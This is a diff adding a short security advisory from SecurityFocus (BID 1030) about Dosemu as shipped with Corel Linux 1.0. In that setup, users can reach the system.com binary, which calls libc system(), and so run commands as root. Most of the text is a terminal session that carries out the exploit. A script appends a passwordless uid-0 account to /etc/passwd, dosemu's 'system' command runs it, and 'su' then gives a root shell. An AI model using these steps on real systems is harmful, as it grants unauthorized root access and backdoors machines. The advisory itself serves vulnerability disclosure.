@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/1030/info
+
+A vulnerability exists in the configuration of Dosemu, the DOS emulator, as shipped with Corel Linux 1.0. Dosemu documentation cautions that the system.com binary should not be made available to users, as it implements the system() libc call. Users can use this command to execute commands as root, and obtain elevated access to the system.
+
+This "vulnerability" has been documented in the Dosemu documentation for a number of years.
+
+Script started on Fri Feb 25 13:54:00 2000
+nebula:~$ id
+uid=1000(suid) gid=1000(suid) groups=1000(suid)
+nebula:~$ cat > hack-corel
+#!/bin/bash
+echo "owned::0:0::/:/bin/bash" >> /etc/passwd
+^D
+nebula:~$ chmod a+rx hack-corel
+nebula:~$ export PATH="$PATH:."
+nebula:~$ dos
+CPU speed set to 430/1 MHz
+Running on CPU=586, FPU=1, rdtsc=1
+
+[ snip bunch of dosemu crap ]
+
+"Welcome to dosemu 0.98!
+C:\> system hack-corel; 
+sh: : command not found 
+C:\> exitERROR: general protection at 0x3f0ff: 0
+ERROR: SIGSEGV, protected insn...exiting!
+nebula:~$ tail -1 /etc/passwd
+owned::0:0::/:/bin/bash
+nebula:~$ su owned
+nebula:/home/suid# id
+uid=0(root) gid=0(root) groups=0(root)
+nebula:/home/suid# exit
+exit
+nebula:~$ exit
